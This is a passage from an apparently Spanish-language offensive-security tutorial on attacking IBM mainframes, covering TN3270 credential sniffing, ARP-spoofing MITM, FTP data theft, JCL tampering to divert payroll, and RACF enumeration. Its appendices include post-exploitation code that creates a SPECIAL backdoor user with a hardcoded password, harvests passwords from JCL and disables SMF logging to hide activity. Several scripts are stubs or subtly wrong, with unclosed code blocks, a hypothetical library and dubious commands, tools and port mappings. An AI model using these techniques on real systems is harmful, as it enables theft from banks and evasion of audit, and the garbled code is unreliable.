Las credenciales en TN3270 viajan en texto plano (sin [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))). Se pueden interceptar con:

**Wireshark Display Filters:**
`
tn3270
tn3270.aid.code == 0x7d  # Tecla Enter
tn3270.aid.code == 0xf1  # PF1
`

**Script de extracción automática:**

`python
class TN3270CredentialExtractor:
    \"\"\"Extrae credenciales de capturas TN3270\"\"\"

    def extract_from_pcap(self, pcap_path: str) -> list:
        packets = rdpcap(pcap_path)
        credentials = []
        current_user = ""
        current_pass = ""

        for pkt in packets:
            if not pkt.haslayer(Raw):
                continue
            data = pkt[Raw].load
            if not data:
                continue

            # Detectar flujo de login TSO
            if b"LOGON" in data or b"logon" in data:
                # Capturar todo el flujo de esta conexión
                stream_data = self._extract_stream(pkt)
                user, passwd = self._parse_login_stream(stream_data)
                if user and passwd:
                    credentials.append({"user": user, "password": passwd})

        return credentials

    def _extract_stream(self, pkt) -> bytes:
        \"\"\"Extrae el flujo completo de la conexión\"\"\"
        # Usar seguimiento de TCP stream en Wireshark
        # o implementar reassembly manual
        return b""
`

### 5.5 TN3270 Enhanced Security

**Mejores prácticas contra intercepción:**
- Usar TN3270S (puerto 992 con [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))
- Implementar AT-TLS (Application Transparent TLS)
- Usar [vpn](../raw/4n0n1m4t0.md#vpn) para conexiones externas
- Implementar RACF con protección de terminal

**Configuración de TN3270 con SSL:**

`ash
# En el mainframe (definición de SSL en VTAM):
//SYSIN   DD *
  DEFINE SSL
  CONNECT SSL_PORT(992)
  CERTOPT(ALLOW_ANY)
/*

# Conexión segura desde cliente:
x3270 -secure mainframe.empresa.com:992
`


## 9. VTAM y [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip) en [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

### 9.1 VTAM: Virtual Telecommunications Access Method

VTAM maneja las comunicaciones en el mainframe. Es la interfaz entre las aplicaciones y la [red](../raw/r3d3s-f0nd4m3nt0s.md).

**Componentes de VTAM:**
- **SSCP**: System Services Control Point (el nodo central)
- **PU**: Physical Unit (cada controlador de red)
- **LU**: Logical Unit (cada terminal o aplicación)
- **SNA**: Systems Network Architecture

`ash
# Comandos VTAM:
D NET,VTAMOPTS    # Opciones de VTAM
D NET,MAJNODES    # Nodos mayores
D NET,LINES       # Líneas de comunicación
D NET,LU,LIST     # Listar LUs activas
D NET,SESSIONS    # Sesiones activas
V NET,ACT,ID=LU1  # Activar LU
V NET,INACT,ID=LU1 # Desactivar LU
`

### 9.2 [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip) y mainframe

El mainframe moderno tiene full [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) stack. Los puertos comunes:

| [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | Servicio | Descripción |
|--------|----------|-------------|
| 21/tcp | FTP | Transferencia de archivos |
| 23/tcp | TN3270 | Terminal 3270 |
| 992/tcp | TN3270S | Terminal 3270 [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) |
| 25/tcp | SMTP | Correo electrónico |
| 135/tcp | [rpc](../raw/w1n-s9bsyst3ms.md#rpc) | Comunicación remota |
| 443/tcp | [https](../raw/r3d3s-f0nd4m3nt0s.md#https) | Web seguro |
| 445/tcp | [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) | Compartición de archivos |
| 515/tcp | LPD | Impresión |
| 1433/tcp | SQL Server | DB2 remoto? |
| 2001/tcp | IBM [http](../raw/r3d3s-f0nd4m3nt0s.md#http) Server | WebSphere |
| 4242/tcp | Remote Command | RSH remoto |
| 4020/tcp | OMVS | Unix System Services |

### 9.3 Puertos y servicios expuestos

`ash
# Enumeración de servicios mainframe desde red:
[nmap](../raw/nm4p.md) -p 23,992,21,443,2001 -sT -A mainframe.empresa.[com](../raw/w1n-s9bsyst3ms.md#com)

# FTP banner grabbing:
ftp mainframe.empresa.com
# Conectado a mainframe.empresa.com.
# 220-FTPD IBM FTP CS V2R3
# 220 Connection will close if idle more than 5 minutes.

# TN3270 banner:
telnet mainframe.empresa.com 23
# IBM
# IBM Z/OS
# login:
`

### 9.4 Ataques a la red mainframe

1. **FTP Anonymous:**
`ash
ftp> open mainframe.empresa.com
Name: anonymous
Password: test@test.com
# Si permite anonymous, se pueden descargar datasets
ftp> get 'SYS1.PARMLIB(IEAAFP00)' parmlib.txt
`

2. **FTP con credenciales:**
`ash
# Si se tienen credenciales de terminal, FTP también funciona
ftp> open mainframe.empresa.com
Name: userid
Password: password
ftp> cd 'USER.DATASET'
ftp> get 'PROD.DATA' prod_data.txt
`

3. **TN3270 [mitm](../raw/m1tm-m0b1l3.md):**
`ash
# ARP spoofing para interceptar TN3270
arpspoof -i eth0 -t mainframe.empresa.com 192.168.1.100
# Redirigir tráfico TN3270
iptables -t [nat](../raw/r3d3s-f0nd4m3nt0s.md#nat) -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323
# Capturar con Python sniffer
`

4. **RSH/Rexec abuso:**
`ash
# Si RSH está habilitado (puerto 4242)
rsh -l userid mainframe.empresa.com command
`

## 10. Core Banking y Batch Processing

### 10.1 Sistemas core bancarios

Los mainframes ejecutan el core bancario de la mayoría de los bancos. Este procesa:
- Transacciones de cajeros automáticos
- Transferencias electrónicas (ACH, SWIFT, SEPA)
- Tesorería
- Gestión de cuentas
- Hipotecas y préstamos

**Componentes típicos:**
`
┌──────────────────────────────────────────────────┐
│  Canales (ATM, Web, Mobile, Branch)              │
├──────────────────────────────────────────────────┤
│  Frontend (CICS transactions)                    │
├──────────────────────────────────────────────────┤
│  Core Banking Engine ([cobol](../raw/l3g4cy-3nt3rpr1s3.md#cobol) programs)            │
├──────────────────────────────────────────────────┤
│  Backend (Batch, IMS/DB, DB2)                    │
└──────────────────────────────────────────────────┘
`

### 10.2 JCL: Job Control Language

JCL es el lenguaje para enviar trabajos batch al [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe). Es el equivalente a un script de shell.

**Estructura básica de JCL:**
`jcl
//TRANSFER JOB (ACCT),'TRANSFERENCIA',CLASS=A,MSGCLASS=X
//*
//STEP1    EXEC PGM=TRANSFER
//INPUT    DD DSN=INPUT.TRANSFER.FILE,DISP=SHR
//OUTPUT   DD DSN=OUTPUT.RESULT.FILE,DISP=OLD
//REPORT   DD SYSOUT=*
//SYSIN    DD *
  DSN=TRANSFER.DATA
  AMOUNT=10000
  FROM=ACCOUNT123
  TO=ACCOUNT456
/*
//*
//STEP2    EXEC PGM=UPDATER
//DATABASE DD DSN=PROD.CUSTOMER.DB,DISP=OLD
`

### 10.3 Manipulación de trabajos batch

**Comandos de gestión:**

`ash
# Enviar trabajo
SUBMIT 'USER.JCL(MYJOB)'

# Ver estado
STATUS MYJOB

# Cancelar
CANCEL MYJOB

# Hold/Release
HOLD MYJOB
RELEASE MYJOB

# Modificar prioridad
CHGJOB MYJOB,PRIORITY=15

# Ver output
OUTPUT MYJOB
PRINT 'USER.OUTPUT(JOB123)'
`

**Inyección en JCL:**
Si un atacante puede modificar un JCL que se ejecuta con autoridad:

`jcl
//MODIFIED JOB
//STEP1    EXEC PGM=IEFBR14
//INSERT   DD DSN=CONFIDENTIAL.DATA,DISP=SHR
//* Agregar paso malicioso
//HACK     EXEC PGM=HACKER
//* Este programa copia datos sensibles
//SYSPRINT DD SYSOUT=*
`

### 10.4 Ataques a procesos batch

**Técnicas de ataque:**

1. **Modificar JCL existente:**
`jcl
//ADDPAY JOB
//STEP1 EXEC PGM=PAYROLL
//INPUT DD DSN=PAYROLL.INPUT,DISP=SHR
//OUTPUT DD DSN=HACKER.BANK.ACCOUNT,DISP=NEW
//* Desviar pagos a cuenta del atacante
`

2. **Enviar JCL con alta autoridad:**
Si se tiene acceso a un usuario con autoridad, se pueden ejecutar trabajos críticos.

3. **Leer SPOOL de otros usuarios:**
`ash
//READSPL JOB
//STEP1 EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN DD *
  OUTPUT *   # Ver todos los outputs
/*

# Si el JES lo permite, se pueden leer outputs de otros trabajos
`

4. **GDG Manipulation (Generation Data Groups):**
Los GDGs mantienen versiones de datasets. Manipular la generación puede causar procesamiento incorrecto.

## 11. Herramientas de Auditoría [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

### 11.1 TN3270 clients

| Cliente | Sistema | Uso |
|---------|---------|-----|
| x3270/c3270 | Linux/Mac | Auditoría automatizada con [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) |
| IBM PCOMM | Windows | Oficial IBM, scripting con EHLLAPI |
| QWS3270 | Windows | Ligero, scripting básico |
| TN3270 en [python](../raw/pyth0n-f0r-h4ck1ng.md) | Multiplataforma | Automatización personalizada |

**Scripting avanzado con c3270:**
`ash
#!/bin/bash
# Script de auditoría automatizada con c3270
c3270 -script mainframe.empresa.[com](../raw/w1n-s9bsyst3ms.md#com) << 'EOF'
Wait(10)
String("IBMUSER")
Tab
String("PASSWORD")
Enter
Wait(5)
String("TSO")
Enter
Wait(3)
String("LISTUSER IBMUSER")
Enter
Wait(2)
String("LISTC LEVEL(SYS1.)")
Enter
Wait(3)
String("LOGOFF")
Enter
Wait(2)
EOF
`

### 11.2 RACF utilities

**Herramientas de auditoría RACF:**

- **RACF Utilities**: RACF Panel (menu), IRRUTIL, RACF commands
- **CARLa (CA-RACF Language)**: CA herramienta de reporting
- **zSecure**: IBM herramienta de auditoría
- **ACF2/Top Secret Audit**: Herramientas nativas de CA/Broadcom

`ash
# RACF reporting commands
SEARCH CLASS(USER)    # Listar usuarios
SEARCH CLASS(GROUP)   # Listar grupos
SEARCH CLASS(DATASET) # Listar datasets protegidos
SEARCH FILTER(*) SPECIAL # Buscar SPECIAL users

# Reportes avanzados
//RACFRPT JOB
//STEP1 EXEC PGM=IRRUTIL
//SYSPRINT DD SYSOUT=*
//SYSIN DD *
  LISTUSER *  NOSUP
/*

//STEP2 EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN DD *
  LISTDSD DATASET * GENERIC
  LISTDSD DATASET SYS1.** GENERIC
  LISTGRP *
  LISTUSER * NOSUP
/*
`

### 11.3 PCOMM y herramientas IBM

**IBM PCOMM (Personal Communications):**
- Emulador 3270/5250 oficial
- Scripting con EHLLAPI (Emulator High-Level Language API)
- Automatización de tareas de auditoría

**Ejemplo EHLLAPI con Python:**
`python
import win32com.client

class PCOMMAutomation:
    def __init__(self, session_id: str = "A"):
        self.session = win32com.client.Dispatch(f"PCOMM.SESSION")
        self.session.SetProperty("Visible", True)

    def connect(self, host: str, port: int = 23):
        self.session.OpenConnection(f"telnet://{host}:{port}")

    def send_keys(self, text: str):
        self.session.SendKeys(text)

    def wait_for_text(self, text: str, timeout: int = 30):
        import time
        for _ in range(timeout):
            if self.session.SearchText(text):
                return True
            time.sleep(1)
        return False

    def get_screen(self) -> str:
        return self.session.GetDisplayText()

    def execute_racf_command(self, cmd: str) -> str:
        self.send_keys(f"{cmd}\\n")
        self.wait_for_text("READY", 5)
        return self.get_screen()
`

### 11.4 Herramientas open-source

**Herramientas de auditoría mainframe:**

| Herramienta | Descripción | Link |
|-------------|-------------|------|
| [meterpreter](../raw/m3t4spl01t.md#meterpreter) mainframe | [metasploit](../raw/m3t4spl01t.md) para z/OS | GitHub |
| Mainfram3Audit | Scripts de auditoría | GitHub |
| zbot | Bot de auditoría TN3270 | GitHub |
| 3270proxy | [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) TN3270 | GitHub |
| RACF-Crack | Password [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) | GitHub |

**Ejemplo de uso:**
`ash
# Clonar repositorio de auditoría
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.com/mainfram3r/mainfram3audit
cd mainfram3audit

# Ejecutar escaneo de seguridad
python mainfram3audit.py --host mainframe.empresa.com --port 23

# Escaneo de usuarios default
python check_default_users.py --host mainframe.empresa.com
`

## 12. Laboratorio Final

**Objetivo:** Realizar una auditoría completa de seguridad a un [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) IBM z/OS (entorno autorizado).

**Escenario:**
Se ha contratado al equipo de seguridad para auditar el mainframe de un banco. Se proporciona acceso controlado a un LPAR de prueba.

**Fases:**

**Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento) (2 horas)**
1. Escanear puertos del mainframe ([nmap](../raw/nm4p.md), TN3270 scanning)
2. Identificar servicios expuestos (FTP, TN3270, RSH, OMVS)
3. Capturar banner de servicios (FTP, TN3270)
4. Identificar versión de z/OS y componentes

**Fase 2: Enumeración de usuarios (2 horas)**
1. Probar credenciales default (IBMUSER/IBMUSER, SYS1/SYS1)
2. Enumerar usuarios existentes con check_user_exists()
3. Identificar grupos de seguridad
4. Buscar usuarios con atributo SPECIAL
5. Verificar políticas de contraseñas

**Fase 3: Análisis RACF (3 horas)**
1. Listar todos los perfiles de usuario
2. Identificar usuarios con SPECIAL y OPERATIONS
3. Revisar perfiles de dataset genéricos
4. Verificar UACC (Universal Access) en datasets sensibles
5. Buscar perfiles FACILITY mal configurados
6. Analizar BPX.SUPERUSER (acceso UNIX)

**Fase 4: Análisis de APF (2 horas)**
1. Listar librerías APF activas
2. Verificar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de acceso a librerías APF
3. Buscar programas sospechosos en APF libs
4. Intentar agregar un dataset a APF (si se tiene autoridad)

**Fase 5: Análisis de JCL y batch (2 horas)**
1. Revisar JCLs en SYS1.PROCLIB y SYS1.PARMLIB
2. Buscar contraseñas en texto claro en JCL
3. Identificar trabajos con autoridad elevada
4. Revisar seguridad de GDG

**Fase 6: CICS (2 horas)**
1. Listar transacciones CICS activas
2. Probar transacciones de sistema sin autenticación
3. Verificar transacciones con RACF
4. Intentar CEMT para gestión del sistema

**Fase 7: Reporte (2 horas)**
Documentar:
- Usuarios y grupos encontrados
- Configuraciones inseguras identificadas
- Riesgos de escalación de privilegios
- Vectores de explotación identificados
- Recomendaciones de remediación

**Entregables:**
- Reporte de auditoría con hallazgos clasificados por severidad
- Script de enumeración personalizado para el entorno
- Recomendaciones priorizadas de remediación

> **Disclaimer:** Este tutorial es con fines educativos. Las técnicas descritas deben ser utilizadas únicamente en entornos autorizados como parte de pruebas de seguridad legítimas.

## Apéndice A: Comandos Rápidos para Pentesting [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

### A.1 TSO Commands

`ash
# Identificación del sistema
WHOAMI       # Usuario actual
TIME         # Fecha/hora del sistema
PROFILE      # Perfil TSO

# Enumeración de datasets
LISTC LEVEL(SYS1.)       # Datasets del sistema
LISTC LEVEL(USER.)       # Datasets de usuario
LISTC LEVEL(PROD.)       # Datasets de producción
LISTC ENTRIES            # Todas las entradas de catálogo

# Gestión de datasets
LISTD 'USER.DATA'        # Detalles de un dataset
LISTDS 'USER.PROD.DATA'  # Atributos del dataset

# Búsqueda en datasets
FIND 'CONTRASEÑA' 'USER.DATA'  # Buscar string en dataset
SUBMIT 'USER.JCL(JOB1)'        # Enviar trabajo

# Información del sistema
D IPLINFO        # Información del IPL (boot)
D M=CPU          # CPUs del sistema
D M=CHP          # Canales de E/S
D PROG,APF       # Librerías APF
D PROG,LNK       # Librerías de linklist
D SMS,STOR        # Storage groups SMS
`

### A.2 JCL Templates para Auditoría

`jcl
//AUDIT1 JOB (SEC),'AUDITORIA',CLASS=A,MSGCLASS=X
//*
//* Auditoría: Listar datasets protegidos
//LISTDS  EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  LISTDSD DATASET * GENERIC
/*
//*
//AUDIT2 JOB (SEC),'AUDITORIA',CLASS=A,MSGCLASS=X
//*
//* Auditoría: Buscar usuarios SPECIAL
//SPECIAL EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  SEARCH FILTER(*) SPECIAL
  SEARCH FILTER(*) OPERATIONS
/*
`

### A.3 Lista de Verificación de Seguridad (Checklist)

**Checklist de auditoría mainframe:**

`
[ ] ¿Hay usuarios con atributo SPECIAL sin justificación?
[ ] ¿Hay usuarios con atributo OPERATIONS?
[ ] ¿Hay librerías APF no autorizadas?
[ ] ¿Hay datasets con UACC(UPDATE) o superior?
[ ] ¿Se usan contraseñas default?
[ ] ¿Hay programas no autorizados en APF libs?
[ ] ¿Las transacciones CICS críticas están protegidas?
[ ] ¿JES permite lectura de SPOOL entre usuarios?
[ ] ¿FTP permite acceso anónimo?
[ ] ¿TN3270 está sobre [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 23 vs 992)?
[ ] ¿Hay perfiles FACILITY mal configurados?
[ ] ¿Los JCL contienen contraseñas en texto claro?
[ ] ¿Los GDG tienen versiones sin protección?
[ ] ¿Hay programas con adopción excesiva (AS400)?
[ ] ¿Los logins fallidos se registran y alertan?
`

## Apéndice B: Glosario de Términos [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

| Término | Significado |
|---------|-------------|
| APF | Authorized Program Facility - mecanismo para programas privilegiados |
| CICS | Customer Information Control System - gestor de transacciones |
| CSA | Common Service Area - memoria del sistema compartida |
| DD | Data Definition - define un archivo en JCL |
| DS | Data [set](../raw/ph1sh1ng.md#social-engineering-toolkit) - archivo en mainframe |
| DSECT | Dummy Section - mapeo de memoria en Assembler |
| IPL | Initial Program Load - boot del mainframe |
| JCL | Job Control Language - lenguaje de trabajos batch |
| JES | Job Entry Subsystem - gestor de trabajos |
| LPAR | Logical Partition - partición lógica del hardware |
| LPA | Link Pack Area - programas compartidos en memoria |
| LU | Logical Unit - punto final en [red](../raw/r3d3s-f0nd4m3nt0s.md) SNA |
| MVS | Multiple Virtual Storage - base de z/OS |
| PARMLIB | Parameter Library - configuración del sistema |
| PDS | Partitioned Data Set - dataset con miembros |
| PDSE | Partitioned Data Set Extended - PDS mejorado |
| PLPA | Pageable Link Pack Area - LPA paginable |
| PROC | Procedure - JCL predefinido (en PROCLIB) |
| PSB | Program Specification Block - definición IMS |
| PURGE | Terminar forzosamente un trabajo |
| RACF | Resource Access Control Facility - seguridad |
| SDUMP | System Dump - volcado de memoria del sistema |
| SMS | Storage Management Subsystem - gestión de almacenamiento |
| SQA | System Queue Area - memoria del sistema |
| SSCP | System Services Control Point - nodo central VTAM |
| SVC | Supervisor Call - llamada al supervisor |
| TSO | Time Sharing Option - interfaz interactiva |
| VIO | Virtual I/O - E/S virtual |
| VSAM | Virtual Storage Access Method - método de acceso |
| VTAM | Virtual Telecommunications Access Method - comunicaciones |
| XCF | Cross-system Coupling Facility - comunicación entre sistemas |

## Apéndice C: Recursos y Referencias

**Documentación oficial IBM:**
- IBM z/OS Introduction and Release Guide
- IBM RACF General User Guide
- IBM CICS Transaction Server for z/OS
- IBM IMS/DB Administration

**Libros recomendados:**
- "[mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) Security" - IBM Redbook
- "RACF Security - Implementation and Administration"
- "CICS Transaction Server Security"
- "z/OS System Programming"

**Herramientas open-source:**
- x3270: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://x3270.[bGP](../raw/r3d3s-4v4nz4d4s.md#bgp).nu/
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark): https://www.[wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark).org/
- [metasploit](../raw/m3t4spl01t.md): módulos mainframe
- [nmap](../raw/nm4p.md): scripts NSE para mainframe

**Comunidad:**
- SHARE (share.org) - Conferencia de usuarios mainframe
- IBM TechU - Technical University
- Mainframe Security Group en LinkedIn

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos y de capacitación en seguridad ofensiva. Todas las técnicas y herramientas descritas deben ser utilizadas únicamente en entornos autorizados y como parte de programas de pruebas de seguridad (pentesting) legítimos. El acceso no autorizado a sistemas mainframe puede constituir un delito en la mayoría de las jurisdicciones. El autor no se hace responsable por el mal uso de esta información.

## Apéndice D: Escenarios de Ataque Reales

### D.1 Caso 1: Robo de datos bancarios vía CICS

**Escenario:**
Un atacante obtiene credenciales de un operador de CICS mediante [phishing](../raw/ph1sh1ng.md). Con esas credenciales, logra acceso al [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) bancario.

**Pasos del ataque:**
1. Credenciales obtenidas: USUARIO CICS con acceso a transacciones de consulta
2. Ejecutar transacción INQR (balance inquiry) para probar acceso
3. Escalar a transacción XFER (transfer) mediante inyección de comandos
4. Descubrir que XFER tiene verificación de autorización por monto
5. Realizar múltiples transferencias de montos pequeños (sub-checking)
6. Encubrir transacciones modificando registros de auditoría
7. Extraer fondos a cuentas controladas

**Técnicas de detección:**
- Anomalías en patrones de transacciones (múltiples transferencias pequeñas)
- Alertas de CICS por uso de transacciones fuera de horario
- Correlación entre usuario y transacciones inusuales

### D.2 Caso 2: APF lib injection

**Escenario:**
Un administrador de sistemas descontento coloca un backdoor en una librería APF del mainframe.

**Pasos:**
1. El admin identifica una librería APF con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) débiles
2. Compila un programa en Assembler que otorga acceso shell
3. Copia el programa a SYS1.LINKLIB
4. El programa se ejecuta con autoridad APF desde cualquier TSO
5. El backdoor permite acceso incluso después de revocar credenciales

**Mitigaciones:**
- Monitoreo de cambios en librerías APF
- Alertas en RACF por SETPROG APF
- Integridad de librerías (verificación [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions))

### D.3 Caso 3: Batch job manipulation

**Escenario:**
Un atacante con acceso TSO modifica un JCL de procesamiento nocturno para desviar pagos.

**Pasos:**
1. Identificar JCL de pago de nómina en PROCLIB
2. Modificar el dataset de salida para incluir cuenta del atacante
3. El trabajo batch se ejecuta con autoridad del propietario
4. Los pagos se procesan incluyendo al atacante
5. Modificar los logs del trabajo para encubrir cambios

**Mitigaciones:**
- Protección RACF en todos los JCL de PROCLIB
- Firma digital de JCL críticos
- Revisión de cambios en miembros de PROCLIB
- Separación de roles (quien envía no es quien modifica)

## Apéndice E: Ejercicios Avanzados

### E.1 Ejercicio: Bypass de RACF via dataset manipulation

**Objetivo:** Demostrar cómo un atacante puede leer un dataset protegido sin autorización directa.

**Entorno:** Simulador z/OS con RACF activo.

**Pasos:**
1. Identificar un dataset público (no protegido)
2. Usar el dataset público como "puente" 
3. Analizar si existe un programa que lea de un dataset no protegido y escriba en uno protegido
4. Modificar los datos de entrada del programa para extraer datos

`python
# Simulación de bypass
class RACFBypassScenario:
    def __init__(self):
        self.accessible_datasets = ["PUBLIC.INPUT"]
        self.target_dataset = "SECRET.OUTPUT"
        self.bridge_program = "PAYROLL.UPDATE"

    def analyze_bridge(self):
        # Buscar programas que conecten datasets públicos con protegidos
        return f"Encontrar programas que lean de PUBLIC.INPUT y escriban en {self.target_dataset}"

    def [exploit](../raw/m3t4spl01t.md#exploits)(self):
        # Engañar al programa bridge para que revele datos
        [payload](../raw/m3t4spl01t.md#payloads) = "EXTRACT ALL; SEND TO PUBLIC.OUTPUT"
        return f"Enviar payload a través de {self.accessible_datasets[0]}"

### E.2 Ejercicio: Post-explotación en [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

**Objetivo:** Practicar técnicas de post-explotación luego de obtener acceso inicial.

**Técnicas:**
1. **Lateral movement**: Moverse entre LPARs usando XCF
2. **Data exfiltration**: Usar FTP para transferir datasets
3. **Persistence**: Crear nuevos usuarios con SPECIAL
4. **Cover tracks**: Modificar logs de RACF y SMF
5. **Credential harvesting**: Extraer contraseñas de JCL y datasets de seguridad

`python
class PostExploitation:
    def add_backdoor_user(self, username: str = "BACKDOOR", group: str = "SYS1"):
        return f"""
ADDUSER {username} NAME('Backdoor User') OWNER(SECADM) -
  DFLTGRP({group}) PASSWORD(B@ckd00r!) SPECIAL OPERATIONS
"""

    def extract_passwords_from_jcl(self):
        return """
//SCAN JOB
//STEP1 EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN DD *
  EXECIO * DISKR 'JCL.LIBRARY(MEMBERS)' (FINIS
  # Buscar PASSWORD= | PASS= | PSWD= en todos los JCL
"""

    def clear_logs(self):
        return "SETR NOTAPE  # Deshabilitar logging SMF temporalmente"
"""

## Apéndice F: Script de Auditoría Rápida (RACF QuickCheck)

`python
#!/usr/bin/env python3
\"\"\"racf_quickcheck.py - Auditoría rápida de RACF\"\"\"

class RACFQuickAudit:
    def __init__(self, tn3270_session):
        self.session = tn3270_session

    def check_special_users(self) -> list:
        self.session.send_command("SEARCH FILTER(*) SPECIAL")
        output = self.session.read_screen()
        return self._parse_user_list(output)

    def check_operations_users(self) -> list:
        self.session.send_command("SEARCH FILTER(*) OPERATIONS")
        return self._parse_user_list(self.session.read_screen())

    def check_apf_libraries(self) -> list:
        self.session.send_command("D PROG,APF,ALL")
        return self._parse_apf_output(self.session.read_screen())

    def check_weak_datasets(self) -> list:
        self.session.send_command("LISTDSD DATASET * GENERIC")
        return self._parse_dataset_output(self.session.read_screen())

    def full_audit(self) -> dict:
        return {
            "special_users": self.check_special_users(),
            "operations_users": self.check_operations_users(),
            "apf_libs": self.check_apf_libraries(),
            "weak_datasets": self.check_weak_datasets()
        }

    def _parse_user_list(self, output: str) -> list:
        return [line.strip() for line in output.split("\\n")
                if line.strip() and not line.startswith("SEARCH")]

    def _parse_apf_output(self, output: str) -> list:
        return [line.strip() for line in output.split("\\n")
                if "DSNAME=" in line or "VOLUME=" in line]

    def _parse_dataset_output(self, output: str) -> list:
        return [line.strip() for line in output.split("\\n")
                if "UACC(" in line or "LEVEL(" in line]
`


## Apéndice G: Comandos JCL Avanzados para Auditoría

### G.1 Copia de Seguridad de Datasets

`jcl
//BACKUP JOB (AUDIT),'BACKUP',CLASS=A,MSGCLASS=X
//*
//BACKUP1 EXEC PGM=ADRDSSU
//SYSPRINT DD SYSOUT=*
//SYSIN DD *
  DUMP DATASET(INCLUDE(PROD.**)) -
    OUTDD(OUTTAPE) -
    TOL(ENQF) -
    ALLDATA(*) -
    ALLEXCP -
    WAIT -
    DELETE
//OUTTAPE DD DSN=BACKUP.PROD.WEEKLY,UNIT=TAPE,DISP=NEW
`

### G.2 Listar Miembros PDS

`jcl
//LSTPDS JOB (AUDIT),'LIST PDS',CLASS=A,MSGCLASS=X
//*
//STEP1 EXEC PGM=IEBPTPCH
//SYSUT1 DD DSN=SYS1.PROCLIB,DISP=SHR
//SYSUT2 DD SYSOUT=*
//SYSIN DD *
  PRINT PDSDIRECTORY
  MAXNAME=9999
/*
`

### G.3 Verificar Integridad de Librerías

`jcl
//VERIFY JOB (AUDIT),'VERIFY',CLASS=A,MSGCLASS=X
//*
//STEP1 EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN DD *
  LISTDSD DATASET SYS1.LINKLIB GENERIC
  LISTDSD DATASET SYS1.CSSLIB GENERIC
  LISTDSD DATASET CEE.SCEERUN GENERIC
/*
`

## Apéndice H: Seguridad por Capas en [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe)

### H.1 Defensa en Profundidad

`
Capa 1: [red](../raw/r3d3s-f0nd4m3nt0s.md) y Perímetro
├── Firewalls específicos para mainframe
├── [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))/[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) con rules para TN3270, FTP, CICS
├── [vpn](../raw/4n0n1m4t0.md#vpn) para conexiones TN3270S
└── Segmentación de red (LPARs aisladas)

Capa 2: [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos)
├── RACF/ACF2/Top Secret
├── APF y Linklist control
├── Parches y PTFs aplicados
├── SMF logging completo
└── UNIXPRIV controls para OMVS

Capa 3: Aplicaciones
├── CICS security (transacciones protegidas)
├── IMS security (PSB/PCB control)
├── DB2 authorization
└── Program call control

Capa 4: Datos
├── VSAM encryption
├── Dataset access control (RACF)
├── Audit logging (SMF)
└── Data masking en producción

Capa 5: Operaciones
├── Separación de roles (Segregación de duties)
├── Cambios con aprobación
├── Auditoría periódica
└── Response plan ante incidentes
`

### H.2 Monitoreo de Seguridad (SMF Records)

SMF (System Management Facilities) registra eventos de seguridad. Records importantes:

| SMF Record | Tipo | Descripción |
|------------|------|-------------|
| 30 | Common | Información general de trabajos |
| 80 | RACF | Eventos de RACF (logins, fallos) |
| 81 | RACF | Cambios en perfiles RACF |
| 83 | RACF | Accesos a datasets |
| 110 | CICS | Transacciones CICS |
| 115 | UNIX | Eventos de OMVS |

`ash
# Verificar logging SMF
D SMF
# SMF STATUS - ACTIVE
# RECORDING - ACTIVE

# Visualizar SMF records
IFASMFDP - leer records SMF
`

## Apéndice I: Integración con Herramientas Modernas

### I.1 Automatización con Ansible

`yaml
---
- name: [mainframe](../raw/l3g4cy-3nt3rpr1s3.md#mainframe) Audit Automation
  hosts: localhost
  tasks:
    - name: Enumerar usuarios RACF
      zos_racf:
        command: search
        class: USER
      register: users

    - name: Verificar APF libraries
      zos_command:
        cmd: "D PROG,APF,ALL"
      register: apf

    - name: Report
      debug:
        msg: "Usuarios: {{ users }}, APF: {{ apf }}"
`

### I.2 [python](../raw/pyth0n-f0r-h4ck1ng.md) SDK para z/OS

`python
# zos_sdk.py - SDK básico para automatización
from zoo import Zoo # Librería hipotética
import paramiko

class ZOSAutomation:
    def __init__(self, host: str, user: str, password: str):
        self.client = paramiko.SSHClient()
        self.client.connect(host, username=user, password=password)

